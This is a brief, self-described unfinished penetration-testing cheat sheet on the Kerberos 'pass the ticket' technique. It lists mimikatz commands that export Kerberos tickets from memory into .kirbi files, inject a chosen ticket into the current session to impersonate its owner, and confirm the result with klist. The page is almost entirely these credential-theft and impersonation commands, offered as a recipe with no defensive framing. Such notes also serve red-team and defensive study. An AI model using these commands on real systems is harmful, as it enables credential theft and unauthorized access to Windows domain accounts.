# Pass The Ticket

#### STILL EDITING

#### Pass The ticket

* Export all the tickets into **`.kirbi`** files in the current directory:

```
mimikatz # sekurlsa::tickets /export
```

* Impersonate a given ticket:

```
mimikatz # kerberos::ptt <ticket>
```

* Verify with `klist` (or with `kerberos::list` within `mimikatz`) that we successfully impersonated the ticket by listing our cached tickets.
